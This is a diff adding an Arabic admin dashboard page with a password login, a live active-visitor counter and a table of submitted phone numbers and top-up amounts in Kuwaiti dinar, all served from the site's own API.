@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>لوحة التحكم</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#f4f6f9; --card:#fff; --ink:#1a1d24; --ink-soft:#6b7280;
+    --line:#e6e8ed; --red:#e4312a; --green:#1e9e5a; --radius:16px;
+    box-sizing:border-box;
+  }
+  *,*::before,*::after{box-sizing:inherit;margin:0;padding:0}
+  body{
+    font-family:'Tajawal',system-ui,-apple-system,sans-serif;
+    background:var(--bg);color:var(--ink);min-height:100vh;
+    -webkit-font-smoothing:antialiased;
+  }
+
+  /* ---------- login ---------- */
+  .login-wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+  .login{
+    background:var(--card);border:1px solid var(--line);border-radius:var(--radius);
+    padding:34px 26px;width:100%;max-width:380px;box-shadow:0 10px 30px rgba(28,33,48,.06);text-align:center;
+  }
+  .login h1{font-size:24px;font-weight:800;margin-bottom:6px}
+  .login p{color:var(--ink-soft);font-size:15px;margin-bottom:22px}
+  .field{
+    border:1.4px solid #dfe2e8;border-radius:12px;height:56px;display:flex;align-items:center;
+    padding:0 14px;margin-bottom:14px;
+  }
+  .field input{border:none;outline:none;width:100%;font-family:inherit;font-size:16px;background:none;text-align:right}
+  .btn{
+    width:100%;height:56px;border:none;border-radius:999px;font-family:inherit;font-weight:800;
+    font-size:17px;color:#fff;background:var(--red);cursor:pointer;transition:.15s;
+  }
+  .btn:active{transform:scale(.99)}
+  .btn.secondary{background:#fff;color:var(--ink);border:1.6px solid var(--line)}
+  .err{color:var(--red);font-size:14px;font-weight:700;min-height:20px;margin-bottom:10px}
+
+  /* ---------- dashboard ---------- */
+  .dash{max-width:900px;margin:0 auto;padding:22px 16px 60px;display:none}
+  .topbar{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:20px;flex-wrap:wrap}
+  .topbar h1{font-size:24px;font-weight:800}
+  .top-actions{display:flex;align-items:center;gap:10px}
+
+  /* wifi / active-visitors button */
+  .wifi-btn{
+    display:inline-flex;align-items:center;gap:10px;background:#fff;border:1.6px solid var(--line);
+    border-radius:999px;padding:10px 16px;font-family:inherit;font-weight:800;font-size:16px;color:var(--ink);
+    cursor:pointer;transition:.15s;
+  }
+  .wifi-btn.live{border-color:var(--green);color:var(--green)}
+  .wifi-btn .count{font-size:18px;min-width:18px;text-align:center}
+  .wifi-btn .dot{width:9px;height:9px;border-radius:50%;background:#c7cad2}
+  .wifi-btn.live .dot{background:var(--green);animation:pulse 1.4s infinite}
+  @keyframes pulse{0%{box-shadow:0 0 0 0 rgba(30,158,90,.5)}70%{box-shadow:0 0 0 8px rgba(30,158,90,0)}100%{box-shadow:0 0 0 0 rgba(30,158,90,0)}}
+
+  .logout{background:none;border:none;color:var(--ink-soft);font-family:inherit;font-weight:700;font-size:15px;cursor:pointer}
+
+  .stats{display:flex;gap:12px;margin-bottom:18px;flex-wrap:wrap}
+  .stat{background:#fff;border:1px solid var(--line);border-radius:14px;padding:16px 18px;flex:1;min-width:150px}
+  .stat .num{font-size:28px;font-weight:800}
+  .stat .lbl{color:var(--ink-soft);font-size:14px;margin-top:2px}
+
+  /* table */
+  .table-card{background:#fff;border:1px solid var(--line);border-radius:var(--radius);overflow:hidden}
+  .table-head{display:flex;align-items:center;justify-content:space-between;padding:16px 18px;border-bottom:1px solid var(--line)}
+  .table-head h2{font-size:18px;font-weight:800}
+  .table-scroll{overflow-x:auto}
+  table{width:100%;border-collapse:collapse;min-width:460px}
+  th,td{padding:15px 18px;text-align:right;font-size:16px}
+  th{background:#fafbfc;color:#3b3f48;font-weight:800;border-bottom:1px solid var(--line)}
+  td{border-bottom:1px solid #f0f2f5}
+  tr:last-child td{border-bottom:none}
+  .phone{font-weight:700;direction:ltr;display:inline-block}
+  .amount{font-weight:800}
+  .time{color:var(--ink-soft);font-size:13px}
+  .empty{padding:40px;text-align:center;color:var(--ink-soft)}
+  .clear-btn{background:none;border:none;color:var(--red);font-family:inherit;font-weight:700;font-size:14px;cursor:pointer}
+</style>
+</head>
+<body>
+
+  <!-- شاشة الدخول -->
+  <div class="login-wrap" id="loginWrap">
+    <div class="login">
+      <h1>لوحة التحكم</h1>
+      <p>أدخل كلمة المرور للدخول</p>
+      <div class="err" id="loginErr"></div>
+      <div class="field">
+        <input type="password" id="password" placeholder="كلمة المرور" autocomplete="current-password">
+      </div>
+      <button class="btn" id="loginBtn">دخول</button>
+    </div>
+  </div>
+
+  <!-- اللوحة -->
+  <div class="dash" id="dash">
+    <div class="topbar">
+      <h1>الطلبات</h1>
+      <div class="top-actions">
+        <button class="wifi-btn" id="wifiBtn" title="الزيارات النشطة">
+          <span class="dot"></span>
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M5 12.55a11 11 0 0 1 14 0"/>
+            <path d="M1.5 9a16 16 0 0 1 21 0"/>
+            <path d="M8.5 16.1a6 6 0 0 1 7 0"/>
+            <line x1="12" y1="20" x2="12.01" y2="20"/>
+          </svg>
+          <span class="count" id="activeCount">0</span>
+        </button>
+        <button class="logout" id="logoutBtn">خروج</button>
+      </div>
+    </div>
+
+    <div class="stats">
+      <div class="stat"><div class="num" id="totalOrders">0</div><div class="lbl">إجمالي الطلبات</div></div>
+      <div class="stat"><div class="num" id="liveVisitors">0</div><div class="lbl">زيارات نشطة الآن</div></div>
+    </div>
+
+    <div class="table-card">
+      <div class="table-head">
+        <h2>رقم الجوال / قيمة الشحن</h2>
+        <button class="clear-btn" id="clearBtn">مسح الكل</button>
+      </div>
+      <div class="table-scroll">
+        <table>
+          <thead>
+            <tr><th>رقم الجوال</th><th>قيمة الشحن</th><th>الوقت</th></tr>
+          </thead>
+          <tbody id="rows">
+            <tr><td colspan="3" class="empty">لا توجد طلبات بعد</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const TOKEN_KEY = 'admin_token';
+  const loginWrap = document.getElementById('loginWrap');
+  const dash = document.getElementById('dash');
+  const loginErr = document.getElementById('loginErr');
+  let pollTimer = null;
+
+  function token(){ return sessionStorage.getItem(TOKEN_KEY); }
+
+  async function login(){
+    loginErr.textContent = '';
+    const pw = document.getElementById('password').value;
+    try{
+      const r = await fetch('/api/admin/login',{
+        method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({password:pw})
+      });
+      if(!r.ok){ loginErr.textContent = 'كلمة المرور غير صحيحة'; return; }
+      const d = await r.json();
+      sessionStorage.setItem(TOKEN_KEY, d.token);
+      showDash();
+    }catch(e){ loginErr.textContent = 'تعذّر الاتصال بالخادم'; }
+  }
+
+  function fmtTime(iso){
+    const d = new Date(iso);
+    return d.toLocaleString('ar-KW',{day:'2-digit',month:'2-digit',hour:'2-digit',minute:'2-digit'});
+  }
+
+  async function loadData(){
+    try{
+      const r = await fetch('/api/admin/submissions',{headers:{'Authorization':'Bearer '+token()}});
+      if(r.status===401){ logout(); return; }
+      const d = await r.json();
+      render(d.submissions || []);
+      setActive(d.active || 0);
+    }catch(e){}
+  }
+
+  function setActive(n){
+    document.getElementById('activeCount').textContent = n;
+    document.getElementById('liveVisitors').textContent = n;
+    document.getElementById('wifiBtn').classList.toggle('live', n > 0);
+  }
+
+  function render(list){
+    document.getElementById('totalOrders').textContent = list.length;
+    const rows = document.getElementById('rows');
+    if(!list.length){ rows.innerHTML = '<tr><td colspan="3" class="empty">لا توجد طلبات بعد</td></tr>'; return; }
+    rows.innerHTML = list.map(s =>
+      '<tr>' +
+        '<td><span class="phone">'+escapeHtml(s.phone)+'</span></td>' +
+        '<td><span class="amount">'+escapeHtml(s.amount)+'</span> د.ك</td>' +
+        '<td class="time">'+fmtTime(s.time)+'</td>' +
+      '</tr>'
+    ).join('');
+  }
+
+  function escapeHtml(x){ return String(x).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+
+  function showDash(){
+    loginWrap.style.display = 'none';
+    dash.style.display = 'block';
+    loadData();
+    clearInterval(pollTimer);
+    pollTimer = setInterval(loadData, 4000); // تحديث تلقائي كل 4 ثوانٍ
+  }
+
+  function logout(){
+    sessionStorage.removeItem(TOKEN_KEY);
+    clearInterval(pollTimer);
+    dash.style.display = 'none';
+    loginWrap.style.display = 'flex';
+  }
+
+  document.getElementById('loginBtn').addEventListener('click', login);
+  document.getElementById('password').addEventListener('keydown', e => { if(e.key==='Enter') login(); });
+  document.getElementById('logoutBtn').addEventListener('click', logout);
+  document.getElementById('wifiBtn').addEventListener('click', loadData);
+  document.getElementById('clearBtn').addEventListener('click', async ()=>{
+    if(!confirm('مسح كل الطلبات؟')) return;
+    await fetch('/api/admin/clear',{method:'POST',headers:{'Authorization':'Bearer '+token()}});
+    loadData();
+  });
+
+  // دخول تلقائي لو فيه جلسة
+  if(token()) showDash();
+</script>
+</body>
+</html>
